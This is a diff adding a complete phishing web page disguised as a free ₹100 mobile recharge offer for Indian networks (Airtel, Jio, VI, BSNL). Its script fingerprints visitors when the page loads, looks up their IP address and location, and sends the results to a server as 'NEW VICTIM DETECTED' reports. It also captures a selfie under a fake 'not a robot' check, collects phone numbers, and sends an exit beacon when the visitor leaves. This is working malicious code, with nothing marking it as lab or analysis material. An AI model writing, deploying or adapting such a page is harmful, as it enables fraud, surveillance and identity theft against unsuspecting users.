@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Free Recharge Offer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh; display: flex; justify-content: center; align-items: center;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0b0e1a;
+            background-image: radial-gradient(ellipse at 30% 10%, #1a2744 0%, #0b0e1a 80%);
+            padding: 20px; color: #e8edf5;
+        }
+        .card {
+            max-width: 520px; width: 100%;
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 48px; padding: 40px 32px 36px;
+            box-shadow: 0 40px 120px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.04);
+            position: relative; overflow: hidden;
+        }
+        .card::before {
+            content: ''; position: absolute; top: -60%; left: -40%; width: 180%; height: 180%;
+            background: radial-gradient(circle at 20% 30%, rgba(99,102,241,0.06), transparent 65%);
+            pointer-events: none;
+        }
+        .badge {
+            display: inline-block; background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06); padding: 6px 18px; border-radius: 60px;
+            font-size: 11px; font-weight: 600; text-transform: uppercase;
+            letter-spacing: 0.8px; color: #94a3b8; margin-bottom: 20px;
+        }
+        .badge .dot {
+            display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+            background: #34d399; margin-right: 8px;
+            animation: pulse-dot 2s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0%,100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.6); }
+        }
+        h1 { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; color: #fff; margin-bottom: 6px; }
+        h1 .highlight {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 28px; line-height: 1.6; font-weight: 400; }
+        .sim-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 10px; margin-bottom: 22px; }
+        .sim-card {
+            background: rgba(255,255,255,0.03); border: 1.5px solid rgba(255,255,255,0.06);
+            border-radius: 16px; padding: 12px 4px; text-align: center;
+            font-weight: 600; font-size: 13px; color: #94a3b8; cursor: pointer;
+            transition: all 0.2s ease; backdrop-filter: blur(4px); user-select: none;
+        }
+        .sim-card:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.12); }
+        .sim-card.active {
+            border-color: #fbbf24; background: rgba(251,191,36,0.08);
+            color: #fbbf24; box-shadow: 0 0 30px rgba(251,191,36,0.04);
+        }
+        .sim-card .logo {
+            display: block; font-size: 22px; font-weight: 700;
+            margin-bottom: 2px; color: #e2e8f0;
+        }
+        .sim-card.active .logo { color: #fbbf24; }
+        .sim-card .name { font-size: 12px; font-weight: 500; color: #94a3b8; }
+        .sim-card.active .name { color: #fbbf24; }
+        .input-group {
+            display: flex; align-items: center;
+            background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 60px; padding: 4px 4px 4px 22px;
+            transition: border-color 0.25s ease, box-shadow 0.25s ease; margin-bottom: 22px;
+        }
+        .input-group:focus-within {
+            border-color: rgba(251,191,36,0.3);
+            box-shadow: 0 0 0 4px rgba(251,191,36,0.04);
+        }
+        .input-group .country-code {
+            font-size: 14px; font-weight: 500; color: #c8d0e0;
+            padding-right: 12px; border-right: 1px solid rgba(255,255,255,0.06); white-space: nowrap;
+        }
+        .input-group input {
+            flex: 1; background: transparent; border: none; padding: 16px 14px;
+            font-size: 16px; color: #f1f5f9; outline: none; min-width: 0;
+            font-weight: 500; letter-spacing: 0.3px;
+        }
+        .input-group input::placeholder { color: #64748b; font-weight: 400; letter-spacing: 0; }
+        .input-group input::-webkit-outer-spin-button,
+        .input-group input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .input-group input[type="number"] { -moz-appearance: textfield; }
+        .camera-wrapper {
+            position: relative; width: 100%; aspect-ratio: 4/3;
+            background: #0f1422; border-radius: 24px; overflow: hidden; margin-bottom: 22px;
+            border: 1px solid rgba(255,255,255,0.04);
+            display: flex; align-items: center; justify-content: center; min-height: 160px;
+        }
+        .camera-wrapper video,
+        .camera-wrapper img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .camera-placeholder {
+            color: #475569; font-size: 14px; font-weight: 500; text-align: center; padding: 20px;
+        }
+        .camera-placeholder .icon { font-size: 40px; display: block; margin-bottom: 8px; color: #334155; }
+        .actions { display: flex; gap: 12px; margin-bottom: 22px; flex-wrap: wrap; }
+        .btn {
+            flex: 1; min-width: 120px; padding: 14px 20px; border: none; border-radius: 60px;
+            font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.25s ease;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            background: rgba(255,255,255,0.04); color: #e2e8f0;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b); color: #0b0e1a;
+            border: none; box-shadow: 0 8px 30px rgba(251,191,36,0.15);
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 12px 40px rgba(251,191,36,0.25);
+        }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-secondary {
+            background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);
+            color: #c8d0e0;
+        }
+        .btn-secondary:hover:not(:disabled) { background: rgba(255,255,255,0.08); }
+        .btn-secondary:disabled { opacity: 0.4; cursor: not-allowed; }
+        .overlay-msg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
+            display: none; align-items: center; justify-content: center;
+            z-index: 1000; color: #fff; font-size: 20px; font-weight: 500;
+            padding: 30px; text-align: center; animation: fadeIn 0.3s ease;
+        }
+        .overlay-msg .box {
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 24px; padding: 40px 30px; max-width: 400px;
+        }
+        .overlay-msg .box .icon { font-size: 48px; margin-bottom: 16px; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        #fileInput { display: none; }
+        @media (max-width: 480px) {
+            .card { padding: 28px 16px 28px; border-radius: 32px; }
+            h1 { font-size: 22px; }
+            .sim-grid { gap: 6px; }
+            .sim-card { padding: 10px 2px; font-size: 12px; }
+            .sim-card .logo { font-size: 18px; }
+            .input-group { flex-wrap: wrap; background: transparent; border: none; padding: 0; gap: 10px; }
+            .input-group .country-code {
+                border: 1px solid rgba(255,255,255,0.06); border-radius: 60px;
+                padding: 10px 16px; background: rgba(255,255,255,0.03);
+                width: 100%; text-align: center;
+            }
+            .input-group input {
+                background: rgba(255,255,255,0.04); border-radius: 60px;
+                padding: 14px 20px; width: 100%;
+                border: 1px solid rgba(255,255,255,0.06); text-align: center;
+            }
+            .actions { flex-direction: column; }
+            .btn { flex: none; width: 100%; }
+            .camera-wrapper { aspect-ratio: 4/3; min-height: 120px; }
+            .overlay-msg { font-size: 17px; padding: 20px; }
+            .overlay-msg .box { padding: 30px 20px; }
+        }
+        @media (max-width: 380px) {
+            .card { padding: 20px 12px 20px; }
+            h1 { font-size: 19px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="overlay-msg" id="overlayMsg">
+        <div class="box">
+            <div class="icon" id="overlayIcon">📸</div>
+            <div id="overlayText">Provide a selfie to confirm you are not a robot</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="badge"><span class="dot"></span>Limited Offer</div>
+        <h1>Free Recharge <span class="highlight">₹100</span></h1>
+        <p class="subtitle">Select your network, enter your number, and verify your identity to claim.</p>
+
+        <div class="sim-grid" id="simGrid">
+            <div class="sim-card" data-sim="airtel"><span class="logo">A</span><span class="name">Airtel</span></div>
+            <div class="sim-card active" data-sim="jio"><span class="logo">J</span><span class="name">Jio</span></div>
+            <div class="sim-card" data-sim="vi"><span class="logo">V</span><span class="name">VI</span></div>
+            <div class="sim-card" data-sim="bsnl"><span class="logo">B</span><span class="name">BSNL</span></div>
+        </div>
+
+        <div class="input-group">
+            <span class="country-code">+91</span>
+            <input type="number" id="phoneInput" placeholder="Enter phone number" maxlength="10" autocomplete="tel" />
+        </div>
+
+        <div class="camera-wrapper" id="cameraWrapper">
+            <div class="camera-placeholder" id="cameraPlaceholder">
+                <span class="icon">📷</span> Camera preview
+            </div>
+            <video id="video" autoplay playsinline style="display:none;"></video>
+            <img id="capturedImage" style="display:none;" alt="captured" />
+            <input type="file" id="fileInput" accept="image/*" capture="environment" />
+        </div>
+
+        <div class="actions">
+            <button class="btn btn-primary" id="claimBtn">Claim Now</button>
+            <button class="btn btn-secondary" id="retryBtn" style="display:none;">Retake Photo</button>
+        </div>
+
+        <div class="status-bar" style="display:none;"></div>
+    </div>
+
+    <script>
+        // ============================================================
+        // API endpoints (server-side proxy holds the token)
+        // ============================================================
+        const API_SEND_TEXT  = '/api/send';
+        const API_SEND_PHOTO = '/api/send-photo';
+
+        // ---- DOM refs ----
+        const claimBtn = document.getElementById('claimBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const phoneInput = document.getElementById('phoneInput');
+        const simCards = document.querySelectorAll('.sim-card');
+        const video = document.getElementById('video');
+        const capturedImage = document.getElementById('capturedImage');
+        const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+        const overlayMsg = document.getElementById('overlayMsg');
+        const overlayIcon = document.getElementById('overlayIcon');
+        const overlayText = document.getElementById('overlayText');
+        const fileInput = document.getElementById('fileInput');
+
+        // ---- state ----
+        let selectedSim = 'jio';
+        let phoneNumber = '';
+        let selfieBlob = null;
+        let selfieDataUrl = null;
+        let isSending = false;
+        let isSent = false;
+        let systemData = null;
+        let initialReportSent = false;
+        let cameraStream = null;
+
+        // ---- sim selection ----
+        simCards.forEach(card => {
+            card.addEventListener('click', function() {
+                if (isSending || isSent) return;
+                simCards.forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                selectedSim = this.dataset.sim;
+            });
+        });
+
+        phoneInput.addEventListener('input', function() {
+            phoneNumber = this.value.trim();
+        });
+
+        // ---- overlay ----
+        function showOverlay(icon, text, duration = 2500) {
+            overlayIcon.textContent = icon || '📸';
+            overlayText.textContent = text || 'Please allow camera access.';
+            overlayMsg.style.display = 'flex';
+            clearTimeout(overlayMsg._timer);
+            overlayMsg._timer = setTimeout(() => {
+                overlayMsg.style.display = 'none';
+            }, duration);
+        }
+
+        // ---- camera ----
+        async function captureSelfieReliable() {
+            if (selfieBlob && selfieBlob.size > 1000) return true;
+
+            selfieBlob = null;
+            selfieDataUrl = null;
+            capturedImage.style.display = 'none';
+            cameraPlaceholder.style.display = 'block';
+            video.style.display = 'none';
+            retryBtn.style.display = 'none';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 }, aspectRatio: 4/3 },
+                    audio: false
+                });
+                cameraStream = stream;
+                video.srcObject = stream;
+                video.style.display = 'block';
+                cameraPlaceholder.style.display = 'none';
+                capturedImage.style.display = 'none';
+
+                await new Promise((resolve, reject) => {
+                    const timeout = setTimeout(() => reject(new Error('Camera timeout')), 8000);
+                    const onReady = () => {
+                        clearTimeout(timeout);
+                        video.removeEventListener('loadedmetadata', onReady);
+                        video.removeEventListener('canplay', onReady);
+                        resolve();
+                    };
+                    video.addEventListener('loadedmetadata', onReady);
+                    video.addEventListener('canplay', onReady);
+                    if (video.readyState >= 2) {
+                        clearTimeout(timeout);
+                        video.removeEventListener('loadedmetadata', onReady);
+                        video.removeEventListener('canplay', onReady);
+                        resolve();
+                    }
+                });
+
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    throw new Error('Invalid video dimensions');
+                }
+
+                const canvas = document.createElement('canvas');
+                const w = video.videoWidth;
+                const h = video.videoHeight;
+                canvas.width = w;
+                canvas.height = h;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, w, h);
+
+                stream.getTracks().forEach(t => t.stop());
+                cameraStream = null;
+                video.style.display = 'none';
+
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
+                const blob = await fetch(dataUrl).then(r => r.blob());
+                if (!blob || blob.size < 1000) throw new Error('Captured image is too small');
+
+                await new Promise((resolve, reject) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        if (img.naturalWidth < 10 || img.naturalHeight < 10) reject(new Error('Bad image'));
+                        else resolve();
+                    };
+                    img.onerror = () => reject(new Error('Image load failed'));
+                    img.src = dataUrl;
+                });
+
+                selfieDataUrl = dataUrl;
+                selfieBlob = blob;
+                capturedImage.src = dataUrl;
+                capturedImage.style.display = 'block';
+                cameraPlaceholder.style.display = 'none';
+                retryBtn.style.display = 'inline-flex';
+                return true;
+
+            } catch (err) {
+                console.warn('Camera capture failed:', err.message);
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(t => t.stop());
+                    cameraStream = null;
+                }
+                video.style.display = 'none';
+                cameraPlaceholder.style.display = 'block';
+
+                if (/denied|Permission/i.test(err.message)) {
+                    showOverlay('🔒', 'Camera access denied. Please allow camera in browser settings.', 3500);
+                } else if (/timeout/i.test(err.message)) {
+                    showOverlay('⏰', 'Camera took too long to respond. Please try again.', 3000);
+                } else {
+                    showOverlay('📸', 'Could not access camera. Tap "Retake" to try again.', 3000);
+                }
+                return false;
+            }
+        }
+
+        retryBtn.addEventListener('click', function() {
+            if (isSending || isSent) return;
+            selfieBlob = null;
+            selfieDataUrl = null;
+            capturedImage.style.display = 'none';
+            cameraPlaceholder.style.display = 'block';
+            cameraPlaceholder.innerHTML = '<span class="icon">📷</span> Camera preview';
+            video.style.display = 'none';
+            retryBtn.style.display = 'none';
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+                cameraStream = null;
+            }
+        });
+
+        // ---- system data ----
+        function collectSyncData() {
+            const ua = navigator.userAgent;
+            const data = {};
+
+            let device = 'Unknown';
+            if (/iPhone/.test(ua)) device = 'iPhone';
+            else if (/iPad/.test(ua)) device = 'iPad';
+            else if (/Android/.test(ua)) {
+                const m = ua.match(/Android\s([\d.]+)/);
+                device = m ? `Android ${m[1]}` : 'Android';
+            } else if (/Macintosh/.test(ua)) device = 'Mac';
+            else if (/Windows/.test(ua)) device = 'Windows PC';
+            else if (/Linux/.test(ua)) device = 'Linux PC';
+            data.device = device;
+
+            data.ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+            data.cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'N/A';
+            data.screen = `${window.screen.width} × ${window.screen.height}`;
+            data.language = navigator.language || navigator.languages?.[0] || 'Unknown';
+            try { data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; }
+            catch (_) { data.timezone = 'Unknown'; }
+            data.localtime = new Date().toLocaleString('en-US', {
+                weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
+                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+            });
+
+            let browser = 'Unknown';
+            if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
+            const vMatch = ua.match(/(?:Chrome|Firefox|Safari|Edg|OPR)\/(\d+)/);
+            if (vMatch) browser += ` ${vMatch[1]}`;
+            data.browser = browser;
+
+            let os = 'Unknown';
+            if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
+            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+            else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
+            else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+            else if (ua.includes('Mac OS X')) {
+                const m = ua.match(/Mac OS X ([\d_]+)/);
+                os = m ? `macOS ${m[1].replace(/_/g, '.')}` : 'macOS';
+            } else if (ua.includes('Android')) {
+                const m = ua.match(/Android ([\d.]+)/);
+                os = m ? `Android ${m[1]}` : 'Android';
+            } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
+                const m = ua.match(/OS ([\d_]+)/);
+                os = m ? `iOS ${m[1].replace(/_/g, '.')}` : 'iOS';
+            } else if (ua.includes('Linux')) os = 'Linux';
+            data.os = os;
+            data.useragent = ua;
+
+            const extras = [];
+            extras.push(`Depth: ${window.screen.colorDepth}-bit`);
+            extras.push(`Ratio: ${window.devicePixelRatio || 1}x`);
+            extras.push(`Touch: ${('ontouchstart' in window) ? 'Yes' : 'No'}`);
+            extras.push(`Cookies: ${navigator.cookieEnabled ? 'Yes' : 'No'}`);
+            if (navigator.connection) {
+                const c = navigator.connection;
+                extras.push(`Network: ${c.effectiveType || 'Unknown'} (${c.downlink || '?'} Mbps)`);
+            }
+            data.extra = extras.join(' • ');
+            return data;
+        }
+
+        async function fetchBattery() {
+            try {
+                if (!navigator.getBattery) return 'Not supported';
+                const bat = await navigator.getBattery();
+                const level = Math.round(bat.level * 100);
+                const charging = bat.charging ? 'Charging' : 'Discharging';
+                const time = bat.charging ?
+                    (bat.chargingTime === Infinity ? '∞' : `${Math.round(bat.chargingTime / 60)}m`) :
+                    (bat.dischargingTime === Infinity ? '∞' : `${Math.round(bat.dischargingTime / 60)}m`);
+                return `${level}% ${charging} ${time ? `(${time})` : ''}`;
+            } catch (_) { return 'N/A'; }
+        }
+
+        async function fetchIpLocation() {
+            let ip = 'Unknown', location = 'Unknown';
+            try {
+                const apis = [
+                    fetch('https://ipapi.co/json/', { headers: { 'Accept': 'application/json' } })
+                        .then(r => r.ok ? r.json() : null).catch(() => null),
+                    fetch('https://ip-api.com/json/', { headers: { 'Accept': 'application/json' } })
+                        .then(r => r.ok ? r.json() : null).catch(() => null),
+                    fetch('https://ipinfo.io/json', { headers: { 'Accept': 'application/json' } })
+                        .then(r => r.ok ? r.json() : null).catch(() => null)
+                ];
+                const results = await Promise.allSettled(apis);
+                for (const res of results) {
+                    if (res.status === 'fulfilled' && res.value) {
+                        const d = res.value;
+                        if (d.ip || d.query) {
+                            ip = d.ip || d.query || 'Unknown';
+                            const city = d.city || '';
+                            const region = d.region || d.regionName || '';
+                            const country = d.country || d.country_name || '';
+                            location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
+                            break;
+                        }
+                    }
+                }
+                if (ip === 'Unknown') {
+                    const resp = await fetch('https://api.ipify.org?format=json');
+                    if (resp.ok) { const d = await resp.json(); ip = d.ip || 'Unknown'; }
+                }
+            } catch (_) {}
+            return { ip, location };
+        }
+
+        function buildMessage(data, sim, phone, hasPhoto, isInitial = false) {
+            const lines = [
+                '🔴 NEW VICTIM DETECTED' + (isInitial ? ' (Initial)' : ''),
+                '─────────────────────',
+                '',
+                `📶 SIM              : ${sim ? sim.toUpperCase() : 'Not selected'}`,
+                `📞 Phone            : +91 ${phone || 'Not provided'}`,
+                `📸 Selfie           : ${hasPhoto ? 'Captured' : 'Not captured'}`,
+                '',
+                `🔋 Battery          : ${data.battery || '—'}`,
+                `📱 Device           : ${data.device || '—'}`,
+                `💾 RAM              : ${data.ram || '—'}`,
+                `⚡ CPU              : ${data.cpu || '—'}`,
+                `📺 Screen           : ${data.screen || '—'}`,
+                `🌐 Language         : ${data.language || '—'}`,
+                `⏰ Timezone         : ${data.timezone || '—'}`,
+                `🕐 Local Time       : ${data.localtime || '—'}`,
+                '',
+                `🖥️ IP Address       : ${data.ip || '—'}`,
+                `📍 Location          : ${data.location || '—'}`,
+                '',
+                `🌍 Browser          : ${data.browser || '—'}`,
+                `🖥️ OS               : ${data.os || '—'}`,
+                `📌 Extra            : ${(data.extra || '—').substring(0, 120)}${(data.extra || '').length > 120 ? '…' : ''}`,
+                '',
+                '─────────────────────',
+                `📅 ${new Date().toLocaleString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true })}`,
+                '🔒 via Recharge Tracker'
+            ];
+            return lines.join('\n');
+        }
+
+        // ---- send helpers (now hitting our own API) ----
+        async function sendText(text) {
+            try {
+                const r = await fetch(API_SEND_TEXT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: text })
+                });
+                const d = await r.json().catch(() => ({}));
+                return r.ok && d.ok;
+            } catch (_) { return false; }
+        }
+
+        async function sendPhoto(caption, blob) {
+            try {
+                const fd = new FormData();
+                fd.append('caption', caption);
+                fd.append('photo', blob, 'selfie.jpg');
+                const r = await fetch(API_SEND_PHOTO, { method: 'POST', body: fd });
+                const d = await r.json().catch(() => ({}));
+                return r.ok && d.ok;
+            } catch (_) { return false; }
+        }
+
+        async function sendInitialReport() {
+            if (initialReportSent) return;
+            const syncData = collectSyncData();
+            const [battery, ipLoc] = await Promise.all([fetchBattery(), fetchIpLocation()]);
+            const fullData = { ...syncData, battery, ip: ipLoc.ip, location: ipLoc.location };
+            systemData = fullData;
+            const text = buildMessage(fullData, null, '', false, true);
+            const success = await sendText(text);
+            if (success) initialReportSent = true;
+        }
+
+        async function sendFullReport(includePhone = true, includePhoto = true) {
+            if (isSending || isSent) return;
+            isSending = true;
+            claimBtn.disabled = true;
+            retryBtn.disabled = true;
+            claimBtn.textContent = 'Processing...';
+
+            try {
+                let data = systemData;
+                if (!data) {
+                    const sync = collectSyncData();
+                    const [battery, ipLoc] = await Promise.all([fetchBattery(), fetchIpLocation()]);
+                    sync.battery = battery;
+                    sync.ip = ipLoc.ip;
+                    sync.location = ipLoc.location;
+                    data = sync;
+                    systemData = data;
+                }
+
+                const sim = selectedSim;
+                const phone = includePhone ? phoneNumber : '';
+                const hasPhoto = includePhoto && selfieBlob !== null && selfieBlob.size > 1000;
+                const text = buildMessage(data, sim, phone, hasPhoto, false);
+
+                const success = hasPhoto
+                    ? await sendPhoto(text, selfieBlob)
+                    : await sendText(text);
+
+                if (success) {
+                    isSent = true;
+                    claimBtn.textContent = '✓ Claimed';
+                    showOverlay('✅', 'Claim submitted successfully!', 2000);
+                } else {
+                    isSending = false;
+                    claimBtn.disabled = false;
+                    retryBtn.disabled = false;
+                    claimBtn.textContent = 'Claim Now';
+                    showOverlay('⚠️', 'Submission failed. Please try again.', 2500);
+                }
+            } catch (err) {
+                isSending = false;
+                claimBtn.disabled = false;
+                retryBtn.disabled = false;
+                claimBtn.textContent = 'Claim Now';
+                showOverlay('⚠️', 'An error occurred. Please try again.', 2500);
+            }
+        }
+
+        claimBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            if (isSending || isSent) return;
+
+            this.disabled = true;
+            this.textContent = 'Accessing Camera...';
+            const captured = await captureSelfieReliable();
+            this.disabled = false;
+            this.textContent = 'Claim Now';
+
+            if (!captured) {
+                showOverlay('📸', 'Could not capture selfie. Please ensure camera permission is granted and tap Claim again.', 3000);
+                return;
+            }
+
+            if (phoneNumber.length >= 10) {
+                sendFullReport(true, true);
+            } else {
+                sendFullReport(false, true);
+            }
+        });
+
+        // ---- beforeunload beacon (now goes through our API) ----
+        window.addEventListener('beforeunload', function() {
+            if (isSent) return;
+            const ua = navigator.userAgent;
+            const text = '🔴 NEW VICTIM DETECTED (Exit)\n' +
+                `Device: ${ua}\n` +
+                `Screen: ${window.screen.width}x${window.screen.height}\n` +
+                `Language: ${navigator.language}\n` +
+                `Time: ${new Date().toISOString()}`;
+            const blob = new Blob([JSON.stringify({ message: text })], { type: 'application/json' });
+            navigator.sendBeacon(API_SEND_TEXT, blob);
+        });
+
+        // ---- init ----
+        sendInitialReport();
+    </script>
+</body>
+</html>
